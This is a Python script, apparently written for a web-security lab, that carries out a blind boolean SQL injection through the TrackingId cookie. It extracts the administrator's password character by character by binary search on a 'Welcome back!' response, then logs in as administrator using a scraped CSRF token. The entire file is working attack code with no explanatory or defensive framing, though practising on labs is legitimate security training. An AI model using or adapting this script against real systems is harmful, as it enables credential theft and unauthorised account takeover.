import sys
import requests
import re

def normal_injection(session, url, cookies, i_start, i_end, i_index):
    original_tracking_id = cookies['TrackingId']
    cookies['TrackingId'] += f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i_index},1)>'" + chr((i_start + i_end) // 2)

    response = session.get(url, cookies=cookies)

    if "Server Error" in response.text:
        print(cookies['TrackingId'])
        print("normal " + response.text)
        return -1

    if "Welcome back!" not in response.text:
        return 1
    return 2

def sp_normal_injection(session, url, cookies, i_start, i_end, i_index):
    original_tracking_id = cookies['TrackingId']
    cookies['TrackingId'] += f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i_index},{i_index})='" + chr(i_start)

    response = session.get(url, cookies=cookies)

    if "Server Error" in response.text:
        print(cookies['TrackingId'])
        print("sp " + response.text)
        return -1

    if "Welcome back!" not in response.text:
        return chr(i_end)
    return chr(i_start)

def equal_injection(session, url, cookies, i_index):
    original_tracking_id = cookies['TrackingId']
    cookies['TrackingId'] += f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i_index},{i_index})='\0"

    response = session.get(url, cookies=cookies)

    if "Server Error" in response.text:
        print(cookies['TrackingId'])
        print("equal " + response.text)
        return -1

    if "Welcome back!" not in response.text:
        return 0
    return 1

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    login_url = url + '/login'
    session = requests.Session()
    
    # Perform an initial request to get cookies
    initial_response = session.get(url)
    cookies = session.cookies.get_dict()

    password = ''
    i_start, i_end, i_index = 32, 126, 1

    while equal_injection(session, url, cookies, i_index) == 0:
        if i_end - i_start > 1:
            result = normal_injection(session, url, cookies, i_start, i_end, i_index)

            if result == -1:
                password += "error"
                break

            mid_point = (i_start + i_end) // 2
            if result == 1:
                i_end = mid_point
            else:
                i_start = mid_point
        else:
            char_result = sp_normal_injection(session, url, cookies, i_start, i_end, i_index)

            if char_result == -1:
                password += "error"
                break

            password += char_result
            i_index += 1
            i_start, i_end = 32, 126
            print(password)

        print(i_index)
    print(password)

    # Get CSRF token from /login
    login_response = session.get(login_url)
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', login_response.text)
    if not csrf_token_match:
        print("CSRF token not found")
        sys.exit(1)
    csrf_token = csrf_token_match.group(1)

    # Log in using the CSRF token, username, and obtained password
    login_data = {
        'username': 'administrator',
        'password': password,
        'csrf': csrf_token
    }
    login_post_response = session.post(login_url, data=login_data)

    if "Welcome" in login_post_response.text:
        print("Login successful!")
    else:
        print("Login failed.")
